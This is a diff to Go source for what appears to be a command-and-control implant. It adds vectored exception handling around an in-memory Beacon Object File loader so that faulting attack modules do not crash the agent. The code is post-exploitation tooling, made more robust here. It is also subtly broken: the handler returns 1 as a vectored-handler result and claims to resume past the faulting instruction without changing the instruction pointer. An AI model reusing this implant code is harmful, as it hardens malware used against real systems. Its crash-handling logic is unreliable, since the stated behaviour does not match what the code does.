@@ -13,6 +13,75 @@ import (
 	"golang.org/x/sys/windows"
 )
 
+// ── VEH Crash Isolation ──────────────────────────────────────────────────────
+var (
+	vehKernel32   = syscall.NewLazyDLL("kernel32.dll")
+	procAddVeh    = vehKernel32.NewProc("AddVectoredExceptionHandler")
+	procRemoveVeh = vehKernel32.NewProc("RemoveVectoredExceptionHandler")
+
+	vehHandle    uintptr
+	vehInstalled bool
+)
+
+const (
+	exceptionExecuteHandler = 1
+	exceptionContinueSearch = 0
+)
+
+// vehCallback is the Vectored Exception Handler callback.
+// Returns EXCEPTION_EXECUTE_HANDLER to resume after the faulting instruction
+// for known crash exceptions, or EXCEPTION_CONTINUE_SEARCH otherwise.
+func vehCallback(exceptionPointers uintptr) uintptr {
+	if exceptionPointers == 0 {
+		return exceptionContinueSearch
+	}
+	// EXCEPTION_POINTERS layout: { ExceptionRecord *EXCEPTION_RECORD, ContextRecord *CONTEXT }
+	// EXCEPTION_RECORD.ExceptionCode is the first DWORD at offset 0
+	exceptionRecord := *(*uintptr)(unsafe.Pointer(exceptionPointers))
+	if exceptionRecord == 0 {
+		return exceptionContinueSearch
+	}
+	code := *(*uint32)(unsafe.Pointer(exceptionRecord))
+
+	switch code {
+	case 0xC0000005, // EXCEPTION_ACCESS_VIOLATION
+		0xC0000094, // EXCEPTION_INT_DIVIDE_BY_ZERO
+		0xC00000FD, // EXCEPTION_STACK_OVERFLOW
+		0xC000001D: // EXCEPTION_ILLEGAL_INSTRUCTION
+		if Debug {
+			fmt.Printf("[bof] VEH caught exception 0x%08X, resuming\n", code)
+		}
+		return exceptionExecuteHandler
+	}
+	return exceptionContinueSearch
+}
+
+func installVEH() {
+	if vehInstalled {
+		return
+	}
+	callback := syscall.NewCallback(vehCallback)
+	// AddVectoredExceptionHandler(firstHandler, handler) -> PVOID
+	ret, _, _ := procAddVeh.Call(1, callback)
+	if ret == 0 {
+		if Debug {
+			fmt.Printf("[bof] VEH install failed\n")
+		}
+		return
+	}
+	vehHandle = ret
+	vehInstalled = true
+}
+
+func removeVEH() {
+	if !vehInstalled {
+		return
+	}
+	procRemoveVeh.Call(vehHandle)
+	vehInstalled = false
+	vehHandle = 0
+}
+
 // ── COFF / BOF Loader ──────────────────────────────────────────────────────────
 
 var (
@@ -183,9 +252,13 @@ type beaconDataParse struct {
 	Indicator int32
 }
 
-// executeBOF loads and runs a BOF from COFF data with arguments
+// executeBOF loads and runs a BOF from COFF data with arguments.
+// Wraps execution with VEH crash isolation to prevent agent crashes.
 func executeBOF(bofData []byte, args string) (string, error) {
 	bofOutputBuf.Reset()
+
+	installVEH()
+	defer removeVEH()
 
 	entryAddr, err := loadAndRunBOF(bofData, args)
 	if err != nil {
